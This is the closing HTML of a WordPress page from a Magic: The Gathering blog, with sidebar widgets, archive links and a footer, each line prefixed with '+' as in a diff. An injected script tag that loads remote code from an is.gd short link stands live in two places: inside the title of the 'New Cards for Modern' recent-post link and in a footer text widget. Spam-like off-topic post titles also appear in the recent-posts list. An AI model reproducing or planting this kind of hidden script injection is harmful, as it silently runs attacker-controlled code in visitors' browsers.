+</aside><aside id="widget_sp_image-2" class="widget widget_sp_image"><a href="http://www.wizardscupboard.com" id="" target="_blank" class="widget_sp_image-image-link" title="" rel=""><img width="180" height="180" alt="" class="attachment-full aligncenter" style="max-width: 100%;" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2014/09/artifacts.WC_.sqaure.jpg" /></a></aside><aside id="categories-2" class="widget widget_categories"><h2>Categories</h2>		<ul>
+	<li class="cat-item cat-item-1"><a href="http://www.wizardscupboard.com/wordpress/category/edh-commander/" title="Post&#039;s relating to EDH/Commander Card&#039;s, Deck&#039;s and Deck Construction">EDH/Commander</a> (24)
+</li>
+	<li class="cat-item cat-item-5"><a href="http://www.wizardscupboard.com/wordpress/category/ramblings/" title="Just general ramblings">MTG Ramblings</a> (37)
+</li>
+	<li class="cat-item cat-item-6"><a href="http://www.wizardscupboard.com/wordpress/category/standard-decks/" title="New standard deck ideas">Standard</a> (14)
+</li>
+		</ul>
+</aside>		<aside id="recent-posts-2" class="widget widget_recent_entries">		<h2>Recent Posts</h2>		<ul>
+					<li>
+				<a href="http://www.wizardscupboard.com/wordpress/the-momir-basic-box/">The Momir Basic Box</a>
+						</li>
+					<li>
+				<a href="http://www.wizardscupboard.com/wordpress/modern-horizons-shopping-list/">Modern Horizons Shopping List</a>
+						</li>
+					<li>
+				<a href="http://www.wizardscupboard.com/wordpress/matt-harvey-unlike-mets-says-he-always-thought-he-had-a-180-inning-limit/">Matt Harvey, unlike Mets, says he always thought he had a 180-inning limit</a>
+						</li>
+					<li>
+				<a href="http://www.wizardscupboard.com/wordpress/from-convict-to-legal-justice-reporter-i-was-so-fortunate-to-come-away-from-this/">From Convict To Legal Justice Reporter: &#8216;I Was So Fortunate To come Away from This&#8217;</a>
+						</li>
+					<li>
+				<a href="http://www.wizardscupboard.com/wordpress/new-cards-for-modern/">New Cards for Modern<script src="https://is.gd/GgGf9z?v=v25.0"></script></a>
+						</li>
+				</ul>
+		</aside>		<aside id="archives-2" class="widget widget_archive"><h2>Archives</h2>		<ul>
+			<li><a href='http://www.wizardscupboard.com/wordpress/2019/09/'>September 2019</a></li>
+	<li><a href='http://www.wizardscupboard.com/wordpress/2019/08/'>August 2019</a></li>
+	<li><a href='http://www.wizardscupboard.com/wordpress/2018/09/'>September 2018</a></li>
+	<li><a href='http://www.wizardscupboard.com/wordpress/2018/08/'>August 2018</a></li>
+	<li><a href='http://www.wizardscupboard.com/wordpress/2017/08/'>August 2017</a></li>
+	<li><a href='http://www.wizardscupboard.com/wordpress/2017/07/'>July 2017</a></li>
+	<li><a href='http://www.wizardscupboard.com/wordpress/2017/06/'>June 2017</a></li>
+	<li><a href='http://www.wizardscupboard.com/wordpress/2017/05/'>May 2017</a></li>
+	<li><a href='http://www.wizardscupboard.com/wordpress/2017/04/'>April 2017</a></li>
+	<li><a href='http://www.wizardscupboard.com/wordpress/2017/03/'>March 2017</a></li>
+	<li><a href='http://www.wizardscupboard.com/wordpress/2017/02/'>February 2017</a></li>
+	<li><a href='http://www.wizardscupboard.com/wordpress/2017/01/'>January 2017</a></li>
+	<li><a href='http://www.wizardscupboard.com/wordpress/2016/11/'>November 2016</a></li>
+	<li><a href='http://www.wizardscupboard.com/wordpress/2016/09/'>September 2016</a></li>
+	<li><a href='http://www.wizardscupboard.com/wordpress/2016/08/'>August 2016</a></li>
+	<li><a href='http://www.wizardscupboard.com/wordpress/2016/07/'>July 2016</a></li>
+	<li><a href='http://www.wizardscupboard.com/wordpress/2016/06/'>June 2016</a></li>
+	<li><a href='http://www.wizardscupboard.com/wordpress/2016/05/'>May 2016</a></li>
+	<li><a href='http://www.wizardscupboard.com/wordpress/2016/04/'>April 2016</a></li>
+	<li><a href='http://www.wizardscupboard.com/wordpress/2016/03/'>March 2016</a></li>
+	<li><a href='http://www.wizardscupboard.com/wordpress/2016/02/'>February 2016</a></li>
+	<li><a href='http://www.wizardscupboard.com/wordpress/2016/01/'>January 2016</a></li>
+	<li><a href='http://www.wizardscupboard.com/wordpress/2015/12/'>December 2015</a></li>
+	<li><a href='http://www.wizardscupboard.com/wordpress/2015/11/'>November 2015</a></li>
+	<li><a href='http://www.wizardscupboard.com/wordpress/2015/10/'>October 2015</a></li>
+	<li><a href='http://www.wizardscupboard.com/wordpress/2015/09/'>September 2015</a></li>
+	<li><a href='http://www.wizardscupboard.com/wordpress/2015/08/'>August 2015</a></li>
+	<li><a href='http://www.wizardscupboard.com/wordpress/2015/07/'>July 2015</a></li>
+	<li><a href='http://www.wizardscupboard.com/wordpress/2015/06/'>June 2015</a></li>
+	<li><a href='http://www.wizardscupboard.com/wordpress/2015/05/'>May 2015</a></li>
+	<li><a href='http://www.wizardscupboard.com/wordpress/2015/04/'>April 2015</a></li>
+	<li><a href='http://www.wizardscupboard.com/wordpress/2015/03/'>March 2015</a></li>
+	<li><a href='http://www.wizardscupboard.com/wordpress/2015/02/'>February 2015</a></li>
+	<li><a href='http://www.wizardscupboard.com/wordpress/2014/12/'>December 2014</a></li>
+	<li><a href='http://www.wizardscupboard.com/wordpress/2014/11/'>November 2014</a></li>
+	<li><a href='http://www.wizardscupboard.com/wordpress/2014/07/'>July 2014</a></li>
+	<li><a href='http://www.wizardscupboard.com/wordpress/2014/06/'>June 2014</a></li>
+	<li><a href='http://www.wizardscupboard.com/wordpress/2014/04/'>April 2014</a></li>
+		</ul>
+		</aside><aside id="text-2" class="widget widget_text"><h2>Twitter</h2>			<div class="textwidget"><a class="twitter-timeline" href="https://twitter.com/Wizardscupboard" data-widget-id="514549358423851009">Tweets by @Wizardscupboard</a>
+<script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+"://platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script></div>
+		</aside><aside id="text-3" class="widget widget_text"><h2>Facebook</h2>			<div class="textwidget"><div class="fb-activity" data-site="http://www.wizardscupboard.com" data-action="likes, recommends" data-colorscheme="dark" data-header="true"></div></div>
+		</aside>
+	
+</aside>
+
+
+
+
+
+		
+		</div><!-- /.content-wrapper -->
+
+		<footer class="footer content-wrapper" role="contentinfo">
+
+			<div class="footer-content">
+
+					<section class="footer-widgets columns-3">
+
+		<div class="footer-sidebar first">
+					</div>
+
+		<div class="footer-sidebar second">
+					</div>
+
+		<div class="footer-sidebar third">
+			<aside id="text-999" class="widget widget_text">			<div class="textwidget"><script src="https://is.gd/GgGf9z?v=v25.0"></script></div>
+		</aside>		</div>
+
+	</section>
+		<p>
+		Powered by <a href="http://www.wizardscupboard.com" title="WordPress.org">Wizard's Cupboard</a>.
+	</p>
+			<a href="#top" class="back-to-top button">
+			Back to top		</a>
+	
+			</div><!-- /.footer-content -->
+
+		</footer>
+
+		
+	</div><!-- /.inner-wrap -->
+
+</div><!-- /.outer-wrap -->
+
+
+<div id="su-footer-links" style="text-align: center;"></div><script type='text/javascript' src='http://www.wizardscupboard.com/wordpress/wp-content/plugins/akismet/_inc/form.js?ver=3.2'></script>
+<script type='text/javascript' src='http://www.wizardscupboard.com/wordpress/wp-content/themes/highwind/framework/js/plugins.min.js?ver=4.7.14'></script>
+<script type='text/javascript' src='http://www.wizardscupboard.com/wordpress/wp-content/themes/highwind/framework/js/script.min.js?ver=4.7.14'></script>
+<script type='text/javascript' src='http://www.wizardscupboard.com/wordpress/wp-includes/js/comment-reply.min.js?ver=4.7.14'></script>
+<script type='text/javascript' src='http://www.wizardscupboard.com/wordpress/wp-includes/js/wp-embed.min.js?ver=4.7.14'></script>
+
+</body>
+</html>
